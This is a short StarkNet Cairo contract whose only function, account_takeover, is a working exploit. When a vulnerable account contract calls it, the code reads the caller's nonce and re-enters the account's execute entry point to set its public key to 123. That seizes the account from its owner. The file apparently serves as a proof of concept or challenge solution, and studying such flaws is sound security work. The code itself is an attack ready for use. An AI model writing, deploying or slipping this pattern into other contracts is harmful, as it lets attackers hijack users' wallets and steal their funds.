# SPDX-License-Identifier: MIT

%lang starknet

from starkware.starknet.common.syscalls import call_contract, get_caller_address, get_tx_info, get_contract_address
from starkware.cairo.common.cairo_builtins import HashBuiltin, SignatureBuiltin

from starkware.cairo.common.alloc import alloc

const GET_NONCE = 552903089969425767928229549651117769995883180701982662494390259046237820117
const EXECUTE = 617075754465154585683856897856256838130216341506379215893724690153393808813
const SET_PUBLIC_KEY = 332268845949430430346835224631316185987738351560356300584998172574125127129

@external
func account_takeover{
        syscall_ptr : felt*,
        pedersen_ptr : HashBuiltin*,
        range_check_ptr
    }():
    alloc_locals
    let (caller) = get_caller_address()

    let (empty_calldata: felt*) = alloc()
    let res = call_contract(
        contract_address=caller,
        function_selector=GET_NONCE, # getNonce
        calldata_size=0,
        calldata=empty_calldata,
    )
    let nonce = res.retdata[0]

    let (call_calldata: felt*) = alloc()

    # call_array
    assert call_calldata[0] = 1
    assert call_calldata[1] = caller
    assert call_calldata[2] = SET_PUBLIC_KEY
    assert call_calldata[3] = 0
    assert call_calldata[4] = 1

    # calldata
    assert call_calldata[5] = 1
    assert call_calldata[6] = 123 # new public key

    # nonce
    assert call_calldata[7] = nonce

    call_contract(
        contract_address=caller,
        function_selector=EXECUTE,
        calldata_size=8,
        calldata=call_calldata,
    )

    return ()
end
